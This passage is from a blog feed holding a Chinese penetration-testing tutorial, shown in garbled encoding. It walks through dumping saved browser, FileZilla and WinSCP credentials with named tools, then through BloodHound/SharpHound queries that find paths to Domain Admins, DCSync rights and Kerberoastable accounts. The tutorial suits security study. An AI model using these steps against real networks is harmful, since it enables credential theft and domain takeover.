alt="image.png"><br>æˆåŠŸè·å–ç”¨æˆ·è´¦å·å¯†ç </p><h4 id="4-è·å–æµè§ˆå™¨ä¿å­˜çš„ç™»å½•å‡­æ®"><a href="#4-è·å–æµè§ˆå™¨ä¿å­˜çš„ç™»å½•å‡­æ®" class="headerlink" title="4.è·å–æµè§ˆå™¨ä¿å­˜çš„ç™»å½•å‡­æ®"></a>4.è·å–æµè§ˆå™¨ä¿å­˜çš„ç™»å½•å‡­æ®</h4><p>HackBrowserDataæ˜¯ä¸€æ¬¾å¼€æºå·¥å…·ï¼Œå¯ä»¥ç›´æ¥ä»æµè§ˆå™¨è§£å¯†æ•°æ®åŒ…åŒ…æ‹¬ç”¨æˆ·ç™»å½•å¯†ç ã€ä¹¦ç­¾ã€cookieã€å†å²è®°å½•ã€ä¿¡ç”¨å¡ã€ä¸‹è½½é“¾æ¥ã€å†å²è®°å½•ç­‰csvæ–‡ä»¶<br>å°†HackBrowserDataä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºç›´æ¥è¿è¡Œå³å¯ã€‚<br>é¡¹ç›®åœ°å€:<a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a><br>ç›´æ¥è¿è¡Œ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051647715.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:Users\&gt;hack-browser-data-windows-64bit.exe</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å¯¼å‡ºçš„csv<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051650833.png" alt="image.png"><br>æˆåŠŸå¯¼å‡ºç”¨æˆ·å¯†ç <br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051653119.png" alt="image.png"></p><h4 id="5-è·å–FileZillaä¿å­˜çš„å‡­æ®"><a href="#5-è·å–FileZillaä¿å­˜çš„å‡­æ®" class="headerlink" title="5.è·å–FileZillaä¿å­˜çš„å‡­æ®"></a>5.è·å–FileZillaä¿å­˜çš„å‡­æ®</h4><p>FileZillaæ˜¯ä¸€æ¬¾å¿«é€Ÿçš„ã€å¯ä¾èµ–çš„ã€å¼€æºçš„FTPå®¢æˆ·ç«¯è½¯ä»¶,å…·å¤‡å¤§å¤šæ•°FTPè½¯ä»¶åŠŸèƒ½.FileZillaä¼šå°†æ‰€æœ‰FTPç™»å½•å‡­æ®ä»¥Base64å¯†æ–‡æ ¼å¼ä¿å­˜åœ¨%USERPROFILE%\AppDate\Roaming\FileZilla\recentservers.xmlæ–‡ä»¶ä¸­ã€‚&lt;User&gt;èŠ‚ç‚¹è®°å½•äº†FTPç™»å½•ç”¨æˆ·,&lt;Pass&gt;èŠ‚ç‚¹è®°å½•äº†Base64åŠ å¯†åçš„ç”¨æˆ·å¯†ç ,å°†åŠ å¯†çš„FTPå¯†ç è§£å¯†å³å¯ã€‚<br>ä½¿ç”¨SharpDecryptPwd ä¸€é”®å¯¼å‡ºFileZillaä¿å­˜çš„FTPç™»å½•å‡­æ®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpDecryptPwd.exe -FileZilla</span><br></pre></td></tr></table></figure><h4 id="6-è·å–WinSCPä¿ç•™çš„ç™»å½•å‡­æ®"><a href="#6-è·å–WinSCPä¿ç•™çš„ç™»å½•å‡­æ®" class="headerlink" title="6.è·å–WinSCPä¿ç•™çš„ç™»å½•å‡­æ®"></a>6.è·å–WinSCPä¿ç•™çš„ç™»å½•å‡­æ®</h4><p>WinSCPæ˜¯Windowsç¯å¢ƒä¸‹ä½¿ç”¨SSHçš„å¼€æºå›¾å½¢åŒ–SFTPå·¥å…·å®¢æˆ·ç«¯.åœ¨ä½¿ç”¨SFTPè¿æ¥æ—¶,å¦‚æœå‹¾é€‰äº†â€ä¿å­˜å¯†ç â€,WinSCpå°±ä¼šå°†å¯†ç ä¿å­˜åœ¨WinSCP.iniæ–‡ä»¶ä¸‹ã€‚Winscppwdå·¥å…·åˆ™å¯ä»¥è¿›è¡Œè§£å¯†.<br>å·¥å…·ä¸‹è½½åœ°å€:<a href="https://www.softpedia.com/get/Security/Password-Managers-Generators/winscppwd.shtml">https://www.softpedia.com/get/Security/Password-Managers-Generators/winscppwd.shtml</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Winscppwd.exe WinSCP.ini reading WinSCP.ini</span><br></pre></td></tr></table></figure><h2 id="5-ä½¿ç”¨BloodHoundè‡ªåŠ¨åŒ–åˆ†æåŸŸç¯å¢ƒ"><a href="#5-ä½¿ç”¨BloodHoundè‡ªåŠ¨åŒ–åˆ†æåŸŸç¯å¢ƒ" class="headerlink" title="5.ä½¿ç”¨BloodHoundè‡ªåŠ¨åŒ–åˆ†æåŸŸç¯å¢ƒ"></a>5.ä½¿ç”¨BloodHoundè‡ªåŠ¨åŒ–åˆ†æåŸŸç¯å¢ƒ</h2><p>é¡¹ç›®åœ°å€:<a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p><p>  BloodHoundæ˜¯ä¸€æ¬¾å¼ºå¤§çš„åŸŸå†…ç¯å¢ƒåˆ†æå·¥å…·ï¼Œå¯ä»¥æ­ç¤ºå¹¶åˆ†æåŸŸç¯å¢ƒä¸­å„å¯¹è±¡ä¹‹é—´<br>çš„å…³ç³»ï¼Œå°†åŸŸå†…ç›¸å…³ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€è®¡ç®—æœºç­‰å¯¹è±¡ä¹‹é—´çš„å…³ç³»ä»¥å¯è§†åŒ–æ–¹å¼å‘ˆç°ã€‚é€šè¿‡BloodHound,æµ‹è¯•äººå‘˜å¯ä»¥æ›´ç›´è§‚ã€æ›´ä¾¿æ·åœ°åˆ†æåŸŸå†…ç¯å¢ƒçš„æ•´ä½“æƒ…å†µï¼Œå¹¶å¿«é€Ÿè¯†åˆ«å‡º<br>å¤æ‚çš„æ”»å‡»è·¯å¾„ã€‚</p><p>BloodHoundåŸºäºNeo4jæ•°æ®åº“ï¼ˆä¸€ç§NoSQLå›¾æ•°æ®åº“ï¼Œå¯å°†ç»“æ„åŒ–æ•°æ®å­˜å‚¨åœ¨ç½‘ç»œä¸Š)ã€‚åœ¨ä½¿ç”¨æ—¶ï¼Œæµ‹è¯•äººå‘˜éœ€æå‰å°†åŸŸç¯å¢ƒä¸­é‡‡é›†åˆ°çš„æ•°æ®å¯¼å…¥BloodHoundçš„Neo4jæ•°æ®åº“ï¼Œç„¶åé€šè¿‡BloodHoundå¯¹è¿™äº›æ•°æ®è¿›è¡Œåˆ†æï¼Œä»¥å¯è§†åŒ–æ–¹å¼å‘ˆç°ã€‚</p><h4 id="1-BloodHoundç¯å¢ƒéƒ¨ç½²"><a href="#1-BloodHoundç¯å¢ƒéƒ¨ç½²" class="headerlink" title="1.BloodHoundç¯å¢ƒéƒ¨ç½²"></a>1.BloodHoundç¯å¢ƒéƒ¨ç½²</h4><p>å‚è€ƒæ–‡ç« :<a href="https://blog.csdn.net/qq_56426046/article/details/126854991">https://blog.csdn.net/qq_56426046&#x2F;article&#x2F;details&#x2F;126854991</a><br>1.å®‰è£…Neo4jæ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install neo4j</span><br></pre></td></tr></table></figure><p>å®‰è£…å¥½åè¿è¡Œå›¾å½¢åŒ–æ•°æ®åº“Neo4j</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">neo4j start</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051813934.png" alt="image.png"></p><p>è®¿é—®<a href="http://localhost:7474/">http://localhost:7474</a><br>é»˜è®¤è´¦å·å¯†ç éƒ½æ˜¯:neo4j<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051816299.png" alt="image.png"></p><p>é¦–æ¬¡ç™»å½•ä¼šæç¤ºä¿®æ”¹å¯†ç ï¼Œä¿®æ”¹å®Œæˆåè·³è½¬è‡³å¦‚ä¸‹é¡µé¢ï¼Œè¡¨ç¤ºNeo4jå®‰è£…æˆåŠŸ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051818723.png" alt="image.png"></p><p>å»å®˜ç½‘ä¸‹è½½BloodHound-linux-x64<br><a href="https://github.com/BloodHoundAD/BloodHound/releases/tag/v4.3.1">https://github.com/BloodHoundAD/BloodHound/releases/tag/v4.3.1</a><br>è§£å‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip BloodHound-linux-x64</span><br></pre></td></tr></table></figure><p>å¯åŠ¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd BloodHound-linux-x64</span><br><span class="line">./BloodHound --no-sandbox</span><br></pre></td></tr></table></figure><p>ç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username:neo4j</span><br><span class="line">Password:123456</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051856397.png" alt="image.png"></p><p>å¯åŠ¨æˆåŠŸé¡µé¢:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051858185.png" alt="image.png"></p><h4 id="2-BloodHoundä½¿ç”¨"><a href="#2-BloodHoundä½¿ç”¨" class="headerlink" title="2.BloodHoundä½¿ç”¨"></a>2.BloodHoundä½¿ç”¨</h4><p>BloodHoundéœ€è¦æ¥è‡ªActive Directoryï¼ˆADï¼‰ç¯å¢ƒçš„ä¸‰æ¡ä¿¡æ¯æ‰èƒ½è¿è¡Œï¼š</p><ul><li>å“ªäº›ç”¨æˆ·ç™»å½•äº†å“ªäº›æœºå™¨</li><li>å“ªäº›ç”¨æˆ·æ‹¥æœ‰ç®¡ç†å‘˜æƒé™</li><li>å“ªäº›ç”¨æˆ·å’Œç»„å±äºå“ªäº›ç»„<br>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ”¶é›†æ­¤ä¿¡æ¯ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œä¹Ÿä¸éœ€è¦åœ¨è¿œç¨‹ç³»ç»Ÿä¸Šæ‰§è¡Œä»£ç ã€‚</li></ul><h5 id="1-é‡‡é›†å¹¶å¯¼å‡ºæ•°æ®"><a href="#1-é‡‡é›†å¹¶å¯¼å‡ºæ•°æ®" class="headerlink" title="1.é‡‡é›†å¹¶å¯¼å‡ºæ•°æ®"></a>1.é‡‡é›†å¹¶å¯¼å‡ºæ•°æ®</h5><p>ä½¿ç”¨å®˜æ–¹æ•°æ®é‡‡é›†å™¨SharpHoundï¼Œæœ‰å¯æ‰§è¡Œæ–‡ä»¶å’ŒPowershellä¸¤ä¸ªç‰ˆæœ¬ã€‚<br>é¡¹ç›®åœ°å€:<a href="https://github.com/BloodHoundAD/SharpHound">https://github.com/BloodHoundAD/SharpHound</a><br>SharpHound ä¼šè‡ªåŠ¨é‡‡é›†åŸŸå†…çš„ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€è®¡ç®—æœºã€ç»„ç­–ç•¥ã€åŸŸä¿¡ä»»å…³ç³»ç­‰ä¿¡æ¯ï¼Œå°†é‡‡é›†åˆ°çš„æ‰€æœ‰ä¿¡æ¯åœ¨å½“å‰ç›®å½•ä¸‹æ‰“åŒ…æˆä¸€ä¸ªä»¥æ—¶é—´æˆ³æ ‡è¯†çš„ZIPæ–‡ä»¶ã€‚SharpHound.exeå¯¹.netframworkç‰ˆæœ¬æœ‰éœ€æ±‚,éœ€å®‰è£…å¯¹åº”ç‰ˆæœ¬ã€‚</p><p>SharpHoundä¸BloodHoundä¹Ÿéœ€è¦ç‰ˆæœ¬åŒ¹é…!</p><p>è¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpHound.exe -c All</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052132117.png" alt="image.png"></p><p>æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆzipæ–‡ä»¶<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052133120.png" alt="image.png"></p><h5 id="2-å¯¼å…¥æ•°æ®"><a href="#2-å¯¼å…¥æ•°æ®" class="headerlink" title="2.å¯¼å…¥æ•°æ®"></a>2.å¯¼å…¥æ•°æ®</h5><p>å°†é‡‡é›†åˆ°çš„.zipæ–‡ä»¶ä¿å­˜è‡³æœ¬åœ°,å•å‡»å³ä¾§çš„Upload DataæŒ‰é’®è‡ªåŠ¨å°†ç”Ÿæˆçš„ZIPæ•°æ®åŒ…å¯¼å…¥<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052136599.png" alt="image.png"></p><p>å¯¼å…¥åBloodHoundè¿›è¡Œè‡ªåŠ¨åŒ–æ•°æ®åˆ†æã€‚åˆ†æç»“æŸå,å·¦ä¾§çš„Database Info æ¨¡å—å¤„å°±æœ‰æ•°æ®äº†<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052223689.png" alt="image.png"></p><p>å¯ä»¥åœ¨Analysisè¿›è¡Œä¸åŒçš„åˆ†ææŸ¥è¯¢,ä¾‹å¦‚Shortest Paths to Domain Admins<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052226252.png" alt="image.png"></p><h5 id="3-èŠ‚ç‚¹ä¿¡æ¯"><a href="#3-èŠ‚ç‚¹ä¿¡æ¯" class="headerlink" title="3.èŠ‚ç‚¹ä¿¡æ¯"></a>3.èŠ‚ç‚¹ä¿¡æ¯</h5><p>BloodHoundé€šè¿‡å›¾å½¢å’Œè¿çº¿æ¥å‘ˆç°æ•°æ®ï¼Œæ¯ä¸ªå›¾å½¢è¢«ç§°ä¸ºä¸€ä¸ªèŠ‚ç‚¹ï¼Œç”¨æ¥è¡¨ç¤ºåŸŸå†…ä¸åŒçš„å¯¹è±¡ã€‚åŸŸå†…ä¸åŒçš„å¯¹è±¡ï¼Œå¦‚ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€è®¡ç®—æœºã€åŸŸã€ç»„ç­–ç•¥ã€ç»„ç»‡å•ä½ç­‰ï¼Œéƒ½ç”¨ä¸“å±çš„å›¾å½¢æ¥è¡¨ç¤ºã€‚</p><p>ç‚¹å‡»ä»»ä¸€èŠ‚ç‚¹ï¼Œå·¦ä¾§çš„Node Infoä¼šæ˜¾ç¤ºå…³äºè¯¥èŠ‚ç‚¹çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬èŠ‚ç‚¹æ¦‚è¿°ã€èŠ‚ç‚¹å±æ€§ã€æ‰€å±ç»„ã€æ‰€æ‹¥æœ‰çš„æƒé™ã€‚ä¸åŒçš„å¯¹è±¡åŒ…å«ä¸åŒç±»å‹çš„èŠ‚ç‚¹ä¿¡æ¯ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052231307.png" alt="image.png"></p><h5 id="4-è¾¹ç¼˜ä¿¡æ¯"><a href="#4-è¾¹ç¼˜ä¿¡æ¯" class="headerlink" title="4.è¾¹ç¼˜ä¿¡æ¯"></a>4.è¾¹ç¼˜ä¿¡æ¯</h5><p>è¾¹ç¼˜æ—¶è¿æ¥ä¸¤ä¸ªç›¸äº’ä½œç”¨çš„èŠ‚ç‚¹ä¹‹é—´çš„è¿çº¿ï¼Œå¯ä»¥ååº”ä¸¤ä¸ªç›¸äº’ä½œç”¨çš„èŠ‚ç‚¹ä¹‹é—´çš„è”ç³»<br>å¦‚å›¾æ‰€ç¤º:å³ä¾§çº¢çº¿æ‰€æŒ‡çš„ä¸¤ä¸ªç»„ä¸ºDOMAIN ADMINSå’ŒENTERPRISE ADMINS<br>ç”¨æˆ·ADMINISTRATORæ˜¯è¿™ä¸¤ç»„çš„æˆå‘˜ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052234885.png" alt="image.png"></p><p>å¸¸è§è¾¹ç¼˜ç±»å‹:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052236789.png" alt="image.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052237119.png" alt="image.png"><br>æ›´å¤šç»†èŠ‚å¯æŸ¥è¯¢å®˜æ–¹æ–‡æ¡£ã€‚</p><h5 id="5-æ•°æ®åˆ†æ"><a href="#5-æ•°æ®åˆ†æ" class="headerlink" title="5.æ•°æ®åˆ†æ"></a>5.æ•°æ®åˆ†æ</h5><p>BloodHoundåœ¨Analysisæ¨¡å—ä¸­é¢„è®¾äº†å¾ˆå¤šæŸ¥è¯¢åŠŸèƒ½ï¼Œå¸¸ç”¨çš„æŸ¥è¯¢åŠŸèƒ½åŠè¯´æ˜è§ä¸‹è¡¨<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052239924.png" alt="image.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052239670.png" alt="image.png"></p><h6 id="1-æŸ¥æ‰¾æ‰€æœ‰çš„åŸŸç®¡ç†å‘˜"><a href="#1-æŸ¥æ‰¾æ‰€æœ‰çš„åŸŸç®¡ç†å‘˜" class="headerlink" title="1.æŸ¥æ‰¾æ‰€æœ‰çš„åŸŸç®¡ç†å‘˜"></a>1.æŸ¥æ‰¾æ‰€æœ‰çš„åŸŸç®¡ç†å‘˜</h6><p>Analysisæ¨¡å—ä¸­çš„â€Find all Domain Adminsâ€,æŸ¥æ‰¾æ‰€æœ‰åŸŸç®¡ç†å‘˜ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052240790.png" alt="image.png"><br>å½“å‰ç¯å¢ƒæœ‰1ä¸ªåŸŸç®¡ç†å‘˜ç”¨æˆ·ï¼Œæ˜¯Domain Adminsç»„çš„æˆå‘˜</p><h6 id="2-è¯†åˆ«è¾¾åˆ°åŸŸç®¡ç†å‘˜çš„æœ€çŸ­è·¯å¾„"><a href="#2-è¯†åˆ«è¾¾åˆ°åŸŸç®¡ç†å‘˜çš„æœ€çŸ­è·¯å¾„" class="headerlink" title="2.è¯†åˆ«è¾¾åˆ°åŸŸç®¡ç†å‘˜çš„æœ€çŸ­è·¯å¾„"></a>2.è¯†åˆ«è¾¾åˆ°åŸŸç®¡ç†å‘˜çš„æœ€çŸ­è·¯å¾„</h6><p>Analysisæ¨¡å—ä¸­çš„â€Find Shortest Paths to Domain Adminsâ€,è¯†åˆ«å‡ºåˆ°è¾¾åŸŸç®¡ç†å‘˜çš„æœ€çŸ­è·¯å¾„<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052247316.png" alt="image.png"></p><p>å¯ä»¥æ ¹æ®ä¸åŒèŠ‚ç‚¹é—´çš„ä¸åŒè¾¹ç¼˜åˆ¤å®šæ”»å‡»æ–¹å¼ï¼Œä»è€Œå®ç°ç›—å–å‡­æ®ç­‰åŠŸèƒ½ã€‚</p><h6 id="3-æŸ¥æ‰¾æ‰€æœ‰æ‹¥æœ‰DCSyncæƒé™çš„ä¸»ä½“"><a href="#3-æŸ¥æ‰¾æ‰€æœ‰æ‹¥æœ‰DCSyncæƒé™çš„ä¸»ä½“" class="headerlink" title="3.æŸ¥æ‰¾æ‰€æœ‰æ‹¥æœ‰DCSyncæƒé™çš„ä¸»ä½“"></a>3.æŸ¥æ‰¾æ‰€æœ‰æ‹¥æœ‰DCSyncæƒé™çš„ä¸»ä½“</h6><p>Analysisæ¨¡å—ä¸­çš„â€Find Principals with DCSync Rightsâ€<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052256187.png" alt="image.png"><br>æ‹¥æœ‰DCSyncæƒé™çš„ä¸»ä½“å¯ä»¥é€šè¿‡Directory Replication Service(DRS)æœåŠ¡çš„GetNCChangesæ¥å£å‘åŸŸæ§å‘èµ·æ•°æ®åŒæ­¥è¯·æ±‚ï¼Œå¹¶ä»åŸŸæ§åˆ¶å™¨è¯·æ±‚æ•°æ®ã€‚é€šè¿‡DCSync,æµ‹è¯•äººå‘˜å¯ä»¥å¯¼å‡ºæ‰€æœ‰åŸŸç”¨æˆ·çš„å“ˆå¸Œå€¼ï¼Œå®ç°éšè”½çš„æƒé™ç»´æŒï¼Œå°†åœ¨åé¢è®²è§£ã€‚</p><h6 id="4-æ˜ å°„åŸŸä¿¡ä»»å…³ç³»"><a href="#4-æ˜ å°„åŸŸä¿¡ä»»å…³ç³»" class="headerlink" title="4.æ˜ å°„åŸŸä¿¡ä»»å…³ç³»"></a>4.æ˜ å°„åŸŸä¿¡ä»»å…³ç³»</h6><p>Analysisæ¨¡å—ä¸­çš„â€Map Domain Trustsâ€,æ˜¾ç¤ºå½“å‰åŸŸä¿¡ä»»å…³ç³»ã€‚åŸŸä¿¡ä»»è§£å†³äº†å¤šåŸŸç¯å¢ƒä¸­çš„è·¨åŸŸèµ„æºå…±äº«é—®é¢˜ï¼Œå…è®¸å—ä¿¡ä»»åŸŸçš„ç”¨æˆ·è®¿é—®ä¿¡ä»»åŸŸä¸­çš„èµ„æºã€‚åŸŸæ˜¯ä¸€ä¸ªå…·æœ‰å®‰å…¨è¾¹ç•Œçš„è®¡ç®—æœºé›†åˆï¼Œä¸¤ä¸ªåŸŸä¹‹é—´å¿…é¡»å…·æœ‰åŸŸä¿¡ä»»å…³ç³»ï¼Œæ‰èƒ½ç›¸äº’è®¿é—®åˆ°å¯¹æ–¹åŸŸçš„èµ„æºã€‚æµ‹è¯•äººå‘˜é€šè¿‡å°è¯•æ”¶é›†æœ‰å…³åŸŸä¿¡ä»»å…³ç³»çš„ä¿¡æ¯ï¼Œå¯ä»¥ä¸ºWindowså¤šåŸŸ&#x2F;åŸŸæ—ç¯å¢ƒä¸­çš„æ¨ªå‘ç§»åŠ¨å¯»æ‰¾æœºä¼šã€‚</p><h6 id="5-è¯†åˆ«åˆ°è¾¾æ— çº¦æŸå§”æ´¾ç³»ç»Ÿçš„æœ€çŸ­è·¯å¾„"><a href="#5-è¯†åˆ«åˆ°è¾¾æ— çº¦æŸå§”æ´¾ç³»ç»Ÿçš„æœ€çŸ­è·¯å¾„" class="headerlink" title="5.è¯†åˆ«åˆ°è¾¾æ— çº¦æŸå§”æ´¾ç³»ç»Ÿçš„æœ€çŸ­è·¯å¾„"></a>5.è¯†åˆ«åˆ°è¾¾æ— çº¦æŸå§”æ´¾ç³»ç»Ÿçš„æœ€çŸ­è·¯å¾„</h6><p>â€œAnalysisâ€æ¨¡å—ä¸­çš„â€œShortest Paths to Unconstrained Delegation Systemsâ€,è¯†åˆ«å‡ºåˆ°è¾¾æ— çº¦æŸå§”æ´¾ç³»ç»Ÿçš„æœ€çŸ­è·¯å¾„ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052305283.png" alt="image.png"><br>åŸŸå§”æ´¾æ˜¯æŒ‡å°†åŸŸå†…ç”¨æˆ·çš„æƒé™å§”æ´¾ç»™æœåŠ¡è´¦æˆ·ï¼Œä½¿å¾—æœåŠ¡è´¦æˆ·èƒ½å¤Ÿä»¥è¯¥ç”¨æˆ·çš„èº«ä»½åœ¨åŸŸå†…å¼€å±•å…¶ä»–æ´»åŠ¨ï¼Œå¦‚è®¿é—®åŸŸå†…çš„å…¶ä»–æœåŠ¡ã€‚å§”æ´¾ä¸ºåŸŸå†…çš„å¤šè·³è®¤è¯å¸¦æ¥å¾ˆå¤§çš„ä¾¿åˆ©ï¼Œä¹Ÿå¸¦æ¥å¾ˆå¤§çš„å®‰å…¨éšæ‚£ã€‚é€šè¿‡æ»¥ç”¨å§”æ´¾ï¼Œç®¡ç†äººå‘˜å¯ä»¥è·å–åŸŸç®¡ç†å‘˜æƒé™ï¼Œæ¥ç®¡æ•´ä¸ªåŸŸç¯å¢ƒï¼Œä¹Ÿå¯ä»¥ç”¨æ¥åˆ¶ä½œåé—¨ï¼Œå®ç°éšè”½çš„æƒé™ç»´æŒã€‚</p><h6 id="6-åˆ—å‡ºæ‰€æœ‰Kerberoastableç”¨æˆ·"><a href="#6-åˆ—å‡ºæ‰€æœ‰Kerberoastableç”¨æˆ·" class="headerlink" title="6.åˆ—å‡ºæ‰€æœ‰Kerberoastableç”¨æˆ·"></a>6.åˆ—å‡ºæ‰€æœ‰Kerberoastableç”¨æˆ·</h6><p>Analysisæ¨¡å—ä¸­çš„â€List all Kerberoastable Accountsâ€ï¼Œåˆ—å‡ºæ‰€æœ‰Kerberoastableç”¨æˆ·ã€‚</p><h6 id="7-è¯†åˆ«è¾¾åˆ°Kerberoastableç”¨æˆ·çš„æœ€çŸ­è·¯å¾„"><a href="#7-è¯†åˆ«è¾¾åˆ°Kerberoastableç”¨æˆ·çš„æœ€çŸ­è·¯å¾„" class="headerlink" title="7.è¯†åˆ«è¾¾åˆ°Kerberoastableç”¨æˆ·çš„æœ€çŸ­è·¯å¾„"></a>7.è¯†åˆ«è¾¾åˆ°Kerberoastableç”¨æˆ·çš„æœ€çŸ­è·¯å¾„</h6><p>Analysisæ¨¡å—ä¸­çš„â€Shortest Paths from Kerberoastable Usersâ€,è¯†åˆ«å‡ºåˆ°è¾¾Kerberoastableç”¨æˆ·çš„æœ€çŸ­è·¯å¾„</p><h6 id="8-è¯†åˆ«åˆ°è¾¾é«˜ä»·å€¼ç›®æ ‡çš„æœ€çŸ­è·¯å¾„"><a href="#8-è¯†åˆ«åˆ°è¾¾é«˜ä»·å€¼ç›®æ ‡çš„æœ€çŸ­è·¯å¾„" class="headerlink" title="8.è¯†åˆ«åˆ°è¾¾é«˜ä»·å€¼ç›®æ ‡çš„æœ€çŸ­è·¯å¾„"></a>8.è¯†åˆ«åˆ°è¾¾é«˜ä»·å€¼ç›®æ ‡çš„æœ€çŸ­è·¯å¾„</h6><p>Analysisæ¨¡å—ä¸­çš„â€Shortest Paths to High Value Targetsâ€ , è¯†åˆ«å‡ºåˆ°è¾¾é«˜ä»·å€¼ç›®æ ‡çš„æœ€çŸ­è·¯å¾„ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052314509.png" alt="image.png"></p><h6 id="9-æŸ¥æ‰¾æ‰€æœ‰éåŸŸæ§åˆ¶å™¨çš„åŸŸç®¡ç†ç™»å½•"><a href="#9-æŸ¥æ‰¾æ‰€æœ‰éåŸŸæ§åˆ¶å™¨çš„åŸŸç®¡ç†ç™»å½•" class="headerlink" title="9.æŸ¥æ‰¾æ‰€æœ‰éåŸŸæ§åˆ¶å™¨çš„åŸŸç®¡ç†ç™»å½•"></a>9.æŸ¥æ‰¾æ‰€æœ‰éåŸŸæ§åˆ¶å™¨çš„åŸŸç®¡ç†ç™»å½•</h6><p>Analysisæ¨¡å—ä¸­çš„â€Find Domain Admin Logons to non-Domain Controllersâ€,å¯ä»¥æ‰¾å‡ºåŸŸç®¡ç†å‘˜åœ¨æ‰€æœ‰éåŸŸæ§çš„ä¸»æœºçš„ç™»å½•ç—•è¿¹,ä¸ºå‡†ç¡®è·å–åŸŸç®¡ç†å‘˜æä¾›äº†æ–¹å‘ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052318582.png" alt="image.png"><br>åŸŸç®¡ç†å‘˜æ›¾åœ¨WIN7.HACK-MY.COMä¸»æœºä¸Šç™»é™†è¿‡ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡å…¥ä¾µè¿™ä¸¤å°ä¸»æœºï¼Œå¯ä»¥æ‰¾åˆ°åŸŸç®¡ç†å‘˜æ´»åŠ¨çš„è¿›ç¨‹ï¼Œé€šè¿‡è¿ç§»è¿›ç¨‹æˆ–ä»¤ç‰Œçªƒå–ç­‰æ‰‹æ®µï¼Œä¾¿å¯è·å–åŸŸç®¡ç†æƒé™ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®åº“åŸºç¡€</title>
      <link href="/2023/09/02/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/09/02/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="æ•°æ®åº“ç³»ç»ŸåŸç†-æœŸæœ«é€Ÿæˆ"><a href="#æ•°æ®åº“ç³»ç»ŸåŸç†-æœŸæœ«é€Ÿæˆ" class="headerlink" title="æ•°æ®åº“ç³»ç»ŸåŸç†-æœŸæœ«é€Ÿæˆ"></a>æ•°æ®åº“ç³»ç»ŸåŸç†-æœŸæœ«é€Ÿæˆ</h1><p>åº”å¯¹æœŸæœ«è€ƒè¯•,å¿«é€Ÿè¿‡ä¸€éæ•°æ®åº“ç³»ç»ŸåŸç†</p><h2 id="1-æ•°æ®åº“æ¦‚è§ˆ"><a href="#1-æ•°æ®åº“æ¦‚è§ˆ" class="headerlink" title="1. æ•°æ®åº“æ¦‚è§ˆ"></a>1. æ•°æ®åº“æ¦‚è§ˆ</h2><h3 id="1-1æ•°æ®åº“ç®¡ç†æŠ€æœ¯çš„å‘å±•"><a href="#1-1æ•°æ®åº“ç®¡ç†æŠ€æœ¯çš„å‘å±•" class="headerlink" 